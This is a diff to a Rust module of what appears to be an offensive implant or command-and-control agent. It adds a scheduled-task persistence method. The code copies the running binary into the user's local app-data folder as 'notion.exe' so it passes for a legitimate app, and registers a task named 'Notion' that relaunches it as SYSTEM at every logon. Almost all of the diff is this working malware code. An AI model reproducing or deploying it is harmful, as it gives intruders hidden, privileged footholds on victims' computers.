@@ -1,7 +1,7 @@
 use std::error::Error;
 use std::env::{var, args};
 use is_root::is_root;
-#[cfg(not(windows))] use crate::cmd::{shell, save};
+use crate::cmd::{shell, save};
 #[cfg(not(windows))] use std::fs::{create_dir, copy, write};
 #[cfg(windows)] use std::path::Path;
 #[cfg(windows)] use winreg::{RegKey};
@@ -119,6 +119,59 @@ pub async fn handle(s: &String, config_options: &mut ConfigOptions) -> Result<St
                     return Ok("[-] WMIC persistence requires admin privileges.".to_string());
                 }
             },
+            "schtasks" => {
+                //Ref: https://pentestlab.blog/2020/01/21/persistence-wmi-event-subscription/
+                //With special thanks to: https://github.com/trickster0/OffensiveRust
+                //OPSEC unsafe! Use with caution
+                let elevated = is_elevated();
+                if elevated {
+                    if let Ok(v) = var("LOCALAPPDATA") {
+                        let cfg_path = format!("{v}\\cfg.json");
+                        save::handle(&cfg_path, config_options).await?;
+                        let mut persist_path: String = v;
+                        persist_path.push_str(r"\notion.exe");
+                        
+                        let exe_path = args().nth(0).unwrap();
+                        match fs_copy(&exe_path, &persist_path) {
+                            Ok(_)  => {
+                                
+                                let encoded_config = config_options.to_base64();
+                                let schtask_arg = format!(r#" /create /tn Notion /tr "C:\Windows\System32\cmd.exe '{persist_path} -c {cfg_path}'" /sc onlogon /ru System""#);
+                                let output = Command::new("schtasks.exe")
+                                    .arg(format!("/create"))
+                                    .arg(format!("/tn"))
+                                    .arg(format!("Notion"))
+                                    .arg(format!("/tr"))
+                                    .arg(format!(r#"{persist_path} -c {cfg_path}"#))
+                                    .arg(format!("/sc"))
+                                    .arg(format!("onlogon"))
+                                    .arg(format!("/ru"))
+                                    .arg(format!("System"))
+                                    .output()
+                                    .expect("failed to execute process");
+                            
+                                    let output_string: String;
+                                    if output.stderr.len() > 0 {
+                                        output_string = String::from_utf8(output.stderr).unwrap();
+                                    } else {
+                                        output_string = String::from_utf8(output.stdout).unwrap();
+                                    }
+                                    return Ok(output_string);
+                            },
+                            Err(e) => { return Ok(e.to_string())}
+                        }
+                
+                    } else {
+                        return Ok("Could not locate APPDATA.".to_string());
+                    }
+                }
+                else{
+                    return Ok("[-] Scheduled task persistence requires admin privileges.".to_string());
+                }
+            },
+
+
+
             _ => Ok("That's not a persistence method!".to_string())
         }
     }
